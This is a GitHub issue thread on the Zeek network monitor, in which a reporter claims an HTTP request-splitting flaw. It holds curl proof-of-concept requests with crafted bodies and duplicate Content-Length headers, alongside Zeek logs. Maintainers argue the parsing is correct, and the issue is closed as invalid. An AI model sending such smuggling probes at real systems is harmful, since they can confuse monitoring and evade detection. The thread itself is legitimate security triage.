
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzeek%2Fzeek%2Fissues%2F1798)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzeek%2Fzeek%2Fissues%2F1798)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=zeek%2Fzeek)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zeek](/zeek)
/
**[zeek](/zeek/zeek)**
Public

* [Notifications](/login?return_to=%2Fzeek%2Fzeek) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fzeek%2Fzeek)
* [Star
   6.6k](/login?return_to=%2Fzeek%2Fzeek)

* [Code](/zeek/zeek)
* [Issues
  156](/zeek/zeek/issues)
* [Pull requests
  10](/zeek/zeek/pulls)
* [Discussions](/zeek/zeek/discussions)
* [Actions](/zeek/zeek/actions)
* [Projects
  0](/zeek/zeek/projects)
* [Wiki](/zeek/zeek/wiki)
* [Security](/zeek/zeek/security)
* [Insights](/zeek/zeek/pulse)

Additional navigation options

* [Code](/zeek/zeek)
* [Issues](/zeek/zeek/issues)
* [Pull requests](/zeek/zeek/pulls)
* [Discussions](/zeek/zeek/discussions)
* [Actions](/zeek/zeek/actions)
* [Projects](/zeek/zeek/projects)
* [Wiki](/zeek/zeek/wiki)
* [Security](/zeek/zeek/security)
* [Insights](/zeek/zeek/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fzeek%2Fzeek%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fzeek%2Fzeek%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# There is a http request splitting vulnerability #1798

Closed

[wubonetcn](/wubonetcn) opened this issue
Sep 24, 2021
· 29 comments

Closed

# [There is a http request splitting vulnerability](#top) #1798

[wubonetcn](/wubonetcn) opened this issue
Sep 24, 2021
· 29 comments

Labels
[Area: Protocol Analysis](/zeek/zeek/labels/Area%3A%20Protocol%20Analysis)
[Invalid / Nothing to do](/zeek/zeek/labels/Invalid%20/%20Nothing%20to%20do)

## Comments

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

### **[wubonetcn](/wubonetcn)** commented [Sep 24, 2021](#issue-1006439707) • edited Loading

| By sending a specific HTTP POST request, ZEEK will split a request into multiple and split the wrong fields. This will invalidate any ZEEK HTTP based security analysis(Including ZEEK's internal security plug-ins).  POC  ``` curl -A '' -H "Content-Length: 1" -X POST -d 'ePOST /a.html HTTP/1.0 Content-Length: 1  abc abc  abc' http://192.168.220.132/a.html  ```  Detailed information  ZEEK version  ``` [root@localhost etc]# zeek -v zeek version 4.1.0  ```  Start ZEEK  ``` [root@localhost etc]# zeekctl deploy checking configurations ... installing ... removing old policies in /opt/zeek/spool/installed-scripts-do-not-touch/site ... removing old policies in /opt/zeek/spool/installed-scripts-do-not-touch/auto ... creating policy directories ... installing site policies ... generating standalone-layout.zeek ... generating local-networks.zeek ... generating zeekctl-config.zeek ... generating zeekctl-config.sh ... stopping ... stopping zeek ... starting ... starting zeek ...  ```  Send normal request  ``` $ curl -A '' -H "Content-Length: 1" -X POST -d 'abcdefg' "http://192.168.220.132/b.html"   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100   153  100   146  100     7  93890   4501 --:--:-- --:--:-- --:--:--  149k<html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html>  ```  ZEEK generates 1 log The request method is POST, the host is 192.168.220.132, and the uri is / b.html  ``` #separator \x09 #set_separator	, #empty_field	(empty) #unset_field	- #path	http #open	2021-09-24-05-00-24 #fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types #types	time	string	addr	port	addr	port	count	string	string	string	string	string	string	string	count	count	count	string	count	string	set[enum]	string	string	set[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string] 1632484819.459273	C24wiZ28yo32mwBMu3	192.168.220.1	64691	192.168.220.132	80	1	POST	192.168.220.132	/b.html	-	-	-	-	1	0	-	-	-	-	(empty)	-	-	-	Fbvx9w4gFY2M8p5l5b	-	-	-	-	-  ```  Send poc  ``` $ curl -A '' -H "Content-Length: 1" -X POST -d 'ePOST /a.html HTTP/1.0 > Content-Length: 1 > abc' "http://192.168.220.132/a.html" > abc abc > abc' "http://192.168.220.132/a.html"   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100   200  100   146  100    54  67655  25023 --:--:-- --:--:-- --:--:--  195k<html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html>  ```  ZEEK generates HTTP logs with 3 errors The first display request method is POST, host is - uri is / a.html The second display request method is bc, host is - uri is abc The third display request method is POST, the host is 192.168.220.132, and the uri is / a.html Obviously, ZEEK divides an HTTP request into three, and the request method, request host and request URI are misplaced. This will invalidate any ZEEK HTTP based analysis. HTTP request splitting vulnerability exists.  ``` #separator \x09 #set_separator	, #empty_field	(empty) #unset_field	- #path	http #open	2021-09-24-05-00-24 #fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types #types	time	string	addr	port	addr	port	count	string	string	string	string	string	string	string	count	count	count	string	count	string	set[enum]	string	string	set[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string] 1632484819.459273	C24wiZ28yo32mwBMu3	192.168.220.1	64691	192.168.220.132	80	1	POST	192.168.220.132	/b.html	-	-	-	-	1	0	-	-	-	-	(empty)	-	-	-	Fbvx9w4gFY2M8p5l5b	-	-	-	-	- 1632484946.877654	CmKAkh1zenUA59sVsj	192.168.220.1	64698	192.168.220.132	80	2	POST	-	/a.html	-	-	-	-	1	0	-	-	-	-	(empty)	-	-	-	FUmgdL1Zmy0pyu5aM6	-	-	-	-	- 1632484946.877654	CmKAkh1zenUA59sVsj	192.168.220.1	64698	192.168.220.132	80	3	bc	-	abc	-	-	-	-	0	0	-	-	-	-	(empty)	-	-	-	-	-	-	-	-	- 1632484946.877654	CmKAkh1zenUA59sVsj	192.168.220.1	64698	192.168.220.132	80	1	POST	192.168.220.132	/a.html	-	-	-	-	1	0	-	-	-	-	(empty)	-	-	-	F0j8nJ1AX0MLkUx1Y7	-	-	-	-	-  ``` |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@rsmmr](https://avatars.githubusercontent.com/u/1934232?s=80&u=bb23a1f33a8f2b455fe051ec728c35c42e5c1b17&v=4)](/rsmmr)

Copy link

Member

### **[rsmmr](/rsmmr)** commented [Sep 28, 2021](#issuecomment-928996435)

| Can you elaborate what you think Zeek should be doing in this case instead?  What Zeek sees here from the client is this:  ``` POST /a.html HTTP/1.1 Host: 127.0.0.1:8080 Accept: */* Content-Length: 1 Content-Type: application/x-www-form-urlencoded  ePOST /a.html HTTP/1.0 Content-Length: 1  abc abc abc  ```  Afaict, Zeek is actually doing as good as it can here: the `Content-Length` headers terminate the HTTP messages, so that HTTP parser will then expect another HTTP request to follow in both cases, and try to parse it accordingly. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 28, 2021](#issuecomment-929018693) • edited Loading

| Can you elaborate what you think Zeek should be doing in this case instead?  What Zeek sees here from the client is this:  ``` POST /a.html HTTP/1.1 Host: 127.0.0.1:8080 Accept: */* Content-Length: 1 Content-Type: application/x-www-form-urlencoded  ePOST /a.html HTTP/1.0 Content-Length: 1  abc abc abc  ```  Afaict, Zeek is actually doing as good as it can here: the `Content-Length` headers terminate the HTTP messages, so that HTTP parser will then expect another HTTP request to follow in both cases, and try to parse it accordingly.  After you send this request, check `/opt/zeek/logs/current/http.log` to find the logs of these errors In this case, ZEEK should produce only one correct record  ``` 1632484946.877654	CmKAkh1zenUA59sVsj	192.168.220.1	64698	192.168.220.132	80	1	POST	192.168.220.132	/a.html	-	-	-	-	1	0	-	-	-	-	(empty)	-	-	-	F0j8nJ1AX0MLkUx1Y7	-	-	-	-	-  ```  However, ZEEK produced three lines of logs. And the second line marks HTTP method as `bc`. Obviously, there is no `bc` such request method in http.  ``` 1632484946.877654	CmKAkh1zenUA59sVsj	192.168.220.1	64698	192.168.220.132	80	3	bc	-	abc	-	-	-	-	0	0	-	-	-	-	(empty)	-	-	-	-	-	-	-	-	-  ```  Using `Content-Length` to segment HTTP requests is dangerous. In this POC, you send an HTTP request, but there are actually two `Content-Length`fields, so this HTTP request will be treated as two.  Here is a similar example, you can have a look. <https://www.blackhat.com/html/webcast/10292020-http-request-smuggling-in-2020.html> |
| --- |

All reactions

Sorry, something went wrong.

[![@rsmmr](https://avatars.githubusercontent.com/u/1934232?s=80&u=bb23a1f33a8f2b455fe051ec728c35c42e5c1b17&v=4)](/rsmmr)

Copy link

Member

### **[rsmmr](/rsmmr)** commented [Sep 29, 2021](#issuecomment-930002359) • edited Loading

| Yeah, I understand what's happening and see the multiple entries in `http.log`. What I'm wondering is how do you think Zeek should be parsing this instead. The following is really the main challenge:  Using `Content-Length` to segment HTTP requests is dangerous  The thing is: That's what `Content-Length` is for. The receiving server will likewise use it to segment the client's data. I don't see how else Zeek (or the server) could parse this otherwise. What would you suggest? |
| --- |

All reactions

Sorry, something went wrong.

[![@sethhall](https://avatars.githubusercontent.com/u/15810?s=80&v=4)](/sethhall)

Copy link

Member

### **[sethhall](/sethhall)** commented [Sep 30, 2021](#issuecomment-931243110)

| I would argue on the side of what Robin's saying here. The intent of the Zeek logs is frequently to take the incoming data and, as accurately as possible, give a representation in logs. I believe that in this case Zeek did exactly that and gave an accurate representation of what was on the wire. If Zeek only printed the single log line as you suggested, it would be confusing because there are legitimately more requests there and they would have been hidden. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931246839)

| But more importantly, ZEEK records a request method as `bc`, which is a fatal error. The real HTTP request method sent by hacker is `POST`, and there is only one method. Even if it is recorded truthfully, it should not record `bc` such an HTTP request method, because there is no such request method in http. |
| --- |

All reactions

Sorry, something went wrong.

[![@sethhall](https://avatars.githubusercontent.com/u/15810?s=80&v=4)](/sethhall)

Copy link

Member

### **[sethhall](/sethhall)** commented [Sep 30, 2021](#issuecomment-931258118)

| Because Zeek never actively participates in transactions, but only sits to the side and observes them we have to acknowledge reality and the reality is that not all of the HTTP verbs that people use are defined in any RFC. If you want to do detection activity, you can create the list of HTTP verbs that you consider to be valid and watch for anything that diverges. The argument that you are making would put us in the position where we wouldn't even be able to do detection of someone attempting a request splitting vulnerability.  Actually, now that I think about it, we already generate "Weirds" whenever a request is seen that isn't in the list defined here:   [zeek/scripts/base/protocols/http/main.zeek](https://github.com/zeek/zeek/blob/9aadc7e42abc77868c502ff707723b22cad98745/scripts/base/protocols/http/main.zeek#L117)  Line 117 in [9aadc7e](/zeek/zeek/commit/9aadc7e42abc77868c502ff707723b22cad98745)   |  | option http\_methods: set[string] = { | | --- | --- | |
| --- | --- | --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931267930)

| Hi [@wubonetcn](https://github.com/wubonetcn)  I just took a look at the talk that you referenced. And I think that what you show here is actually not buggy behavior.  From my understanding, HTTP request smuggling works by you having *several different* `content-length` headers in a HTTP request. So something like...  ``` POST / HTTP/1.1 Content-Length: 0 Content-Length: 10 ...  ```  where different software interprets the content-length differently. In the example that you give, there is only one content-length - so there only is one viable interpretation, which Zeek chooses.  I just did a quick test what happens when several different Content-length headers are present, using...  ``` curl -A '' -H "Content-Length: 1" -H "Content-Length: 10" -X POST -d 'POST /a.html HTTP/1.0' http://google.com  ```  The resulting log here is not optimal, we definitely get confused:  ``` 1633003668.962276	CN0f2c1bzcS0IQu6x6	192.168.0.105	51430	142.250.187.206	80	1	POST	google.com	/	-	1.0	-	-	10	54	400	Bad Request	-	-(empty)	-	-	-	FRkdK44SX5siqyb0Hi	-	text/plain	FphsVe3pQDVQSOSrq9	-	text/html 1633003668.984800	CN0f2c1bzcS0IQu6x6	192.168.0.105	51430	142.250.187.206	80	2	ml	-	(empty)	-	-	-	-	0	0	-	-	-	-	(empty)	--	-	-	-	-	-	-	-  ```  and weird.log:  ``` 1633003668.984800	CN0f2c1bzcS0IQu6x6	192.168.0.105	51430	142.250.187.206	80	missing_HTTP_uri	-	F	zeek	HTTP 1633003668.984800	CN0f2c1bzcS0IQu6x6	192.168.0.105	51430	142.250.187.206	80	HTTP_version_mismatch	-	F	zeek	HTTP 1633003668.984800	CN0f2c1bzcS0IQu6x6	192.168.0.105	51430	142.250.187.206	80	unknown_HTTP_method	ml	F	zeek	-  ```  My read of RFC7230 is that several content-length headers with different values is just completely illegal, and that, in that case, a server (or client) should stop processing the data. Since we are a man-in-the-middle-observer we don't really have the option of stopping a connection that does that. My feeling is that we should report a weird if we see several different content-length headers. I am not sure what we should do from a parsing point of view in these cases - do you have any opinion of that?  In any case - I don't think that this, as originally reported, is an issue. Please let me knof if I am mistaken about this. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931273973)

| In fact, you can easily solve this problem. I see a `uid` field in ZEEK's http.log log, which remains unchanged in the log parsing of the three errors. I recommend that zeek use the `uid` field to incorporate the parsing of these errors. One `uid` corresponds to one HTTP log output. All requests with the same `uid` field should no longer be split based on Content-Length. I think ZEEK can solve the problem of HTTP request smuggling by using `uid` field to merge output in parsing. |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931276606)

| we have to use the content-length to parse requests. As, by the way, the talk you referenced makes clear. Without the content-length you cannot decide when a request ends - and there can (and will) be several HTTP requests in one connection. |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931281339)

| For example, how should Zeek parse the result of the following curl command without using Content-length:  ``` curl -X POST -d 'POST /a.html HTTP/1.0' http://example.com/contact.php -X POST -d 'POST /a.html HTTP/1.0' http://example.com/contact.php  ```  This results in 4 POST lines in 2 requests - that are correctly parsed. There also is no ambiguity what should happen here - just as there is none in your example. The only problem that I can see is having two content-lengths in one http request - which is an undecidable problem. |
| --- |

All reactions

Sorry, something went wrong.

[![@sethhall](https://avatars.githubusercontent.com/u/15810?s=80&v=4)](/sethhall)

Copy link

Member

### **[sethhall](/sethhall)** commented [Sep 30, 2021](#issuecomment-931288298)

| Oh! The request splitting is due to multiple repeated headers. The original example didn't do that. I definitely agree that it would make sense to do a weird if there are multiple content-length headers. That's definitely just another one of those undecidable situations that we inevitably run into. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931290231)

| Yes, it's not only your software that has this problem, but also many software. I see that F5 seems to solve the same problem. You can have a look. <https://support.f5.com/csp/article/K50375550> Their solution is to strictly follow the HTTP RFCs (for example, RFC7230, RFC2616). |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931292052)

| [@wubonetcn](https://github.com/wubonetcn) - the difference is that they are an active participant. We are a passive participant. We cannot terminate a connection, like a proxy can.  So - we have to choose to parse one variant if we are presented with multiple content-length headers. The only alternative is to stop processing the HTTP connection completely - which also does not seem like the optimal way to do it, since that means that no more information about the connection will be logged. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931294286)

| I did an experiment before. Using Wireshark's HTTP tracking function, there will be no multiple parsing results. They can handle this problem well. |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931297133)

| Wireshark parses your example POC just like Zeek does, as 3 requests...  [Screenshot 2021-09-30 at 13 56 37](https://user-images.githubusercontent.com/1538460/135459251-c9f02f58-dd6d-4034-819e-8a8bbd81df15.png)  Follow tcp-stream output:  [Screenshot 2021-09-30 at 13 57 38](https://user-images.githubusercontent.com/1538460/135459348-2151e5a3-8a6a-448c-9801-101400b0a83f.png) |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931297580)

| If you think that wireshark does this differently to Zeek, please provide a pcap where this is the case. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931313049)

| The example you provided can be used. Red is the request and blue is the response. The red request is complete and not split. |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931338837) • edited Loading

| This is not true - you misunderstand the output of Wireshark.  Red/blue is just the direction of traffic in this case (follow TCP stream). If you look at the output above, wireshark does indeed split this into three different requests - just as Zeek does. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931345082)

| Oh, it seems that I read Wireshark wrong.It seems that we need to find other solutions. |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931348733) • edited Loading

| As mentioned by Robin in the second comment - for your report there actually is no problem. Wireshark, Zeek, and proxies will all interpret this as 3 different requests - in accordance with the standards.  The problem that we do have is that we cannot decide what to do if we get a request of the form:  ``` POST /a.html HTTP/1.1 Host: 127.0.0.1:8080 Accept: */* Content-Length: 1 Content-Length: 10 Content-Type: application/x-www-form-urlencoded  ```  In this case, we have no way of knowing if the software at the other end of the connection will interpret this with content-length 1, or content-length 10 - but we do have to decide for one of the choices. The RFC just tells you that this is invalid - which is true, but does not directly help us.  We can raise a weird - but we still do have to decide what to do parsing-wise. And this is just undecidable - there is no correct answer. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931354709)

| OK,this is really a difficult problem to solve. I'll contact you if I can think of a solution. |
| --- |

All reactions

Sorry, something went wrong.

[![@stevesmoot](https://avatars.githubusercontent.com/u/14839896?s=80&v=4)](/stevesmoot)

Copy link

Contributor

### **[stevesmoot](/stevesmoot)** commented [Sep 30, 2021](#issuecomment-931514278) via email

| You may also be interested in the package <https://github.com/precurse/zeek-httpattacks> -s … On Thu, Sep 30, 2021 at 7:06 AM wubonetcn \*\*\*@\*\*\*.\*\*\*> wrote: OK,this is really a difficult problem to solve. I'll contact you if I can think of a solution. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <[#1798 (comment)](https://github.com/zeek/zeek/issues/1798#issuecomment-931354709)>, or unsubscribe <<https://github.com/notifications/unsubscribe-auth/ADRHAWCRDOKXMJO4P5KYWBLUERVFBANCNFSM5EV47F3A>> . Triage notifications on the go with GitHub Mobile for iOS <<https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>> or Android <<https://play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub>>. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931524601)

| You may also be interested in the package <https://github.com/precurse/zeek-httpattacks> -s … On Thu, Sep 30, 2021 at 7:06 AM wubonetcn ***@***.\*\*\*> wrote: OK,this is really a difficult problem to solve. I'll contact you if I can think of a solution. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <[#1798 (comment)](https://github.com/zeek/zeek/issues/1798#issuecomment-931354709)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/ADRHAWCRDOKXMJO4P5KYWBLUERVFBANCNFSM5EV47F3A> . Triage notifications on the go with GitHub Mobile for iOS <https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675> or Android <https://play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub>.  Thank you. The script you provide can detect such events and generate a new event record. However, we use ZEEK as an HTTP traffic recorder. This security event detection is done by our other programs. ZEEK provides the original HTTP input. The problem now is that ZEEK will generate three records from an HTTP connection. In this way, we will also get 3 wrong inputs, which will lead to problems in our test results. Of course, other scripts based on HTTP statistics will also make errors, such as the HTTP flood detection script provided by ZEEK. Such scripts based on request quantity statistics will make errors because more records are generated. |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931528986)

| My suggestion is that an HTTP connection only generates one record, even if there are multiple transmissions in the HTTP connection. ZEEK, as a faithful recorder, should be regarded as the same connection as long as the HTTP connection is not disconnected. |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931533717)

| My suggestion is that an HTTP connection only generates one record, even if there are multiple transmissions in the HTTP connection. ZEEK, as a faithful recorder, should be regarded as the same connection as long as the HTTP connection is not disconnected.  If you mean this as "you should only record one http log line for each http TCP connection" - I do not see how this is viable/desirable/reasonable. One HTTP connection can contain thousands of requests - people use Zeek because they want this logged. |
| --- |

All reactions

Sorry, something went wrong.

[![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=80&v=4)](/0xxon)

Copy link

Member

### **[0xxon](/0xxon)** commented [Sep 30, 2021](#issuecomment-931535242)

| Thank you. The script you provide can detect such events and generate a new event record. However, we use ZEEK as an HTTP traffic recorder. This security event detection is done by our other programs. ZEEK provides the original HTTP input. The problem now is that ZEEK will generate three records from an HTTP connection. In this way, we will also get 3 wrong inputs, which will lead to problems in our test results.  As mentioned above - Zeek produces the output that is required by the HTTP RFCs. For your example there is no ambiguity around this - it is 3 requests, not one. So you do get the correct output - Zeek records the traffic as it happened (thus, as 3 requests, just as Wireshark, e.g., parses it)  Why do you want this logged as one request? Why do you think it should be logged as such? |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931545003)

| Thank you. The script you provide can detect such events and generate a new event record. However, we use ZEEK as an HTTP traffic recorder. This security event detection is done by our other programs. ZEEK provides the original HTTP input. The problem now is that ZEEK will generate three records from an HTTP connection. In this way, we will also get 3 wrong inputs, which will lead to problems in our test results.  As mentioned above - Zeek produces the output that is required by the HTTP RFCs. For your example there is no ambiguity around this - it is 3 requests, not one. So you do get the correct output - Zeek records the traffic as it happened (thus, as 3 requests, just as Wireshark, e.g., parses it)  Why do you want this logged as one request? Why do you think it should be logged as such?  Didn't you see the previous discussion? |
| --- |

All reactions

Sorry, something went wrong.

[![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=80&u=35ca91ca4bec17945c0528bbb624e3a4463cbbf7&v=4)](/wubonetcn)

Copy link

Author

### **[wubonetcn](/wubonetcn)** commented [Sep 30, 2021](#issuecomment-931546271)

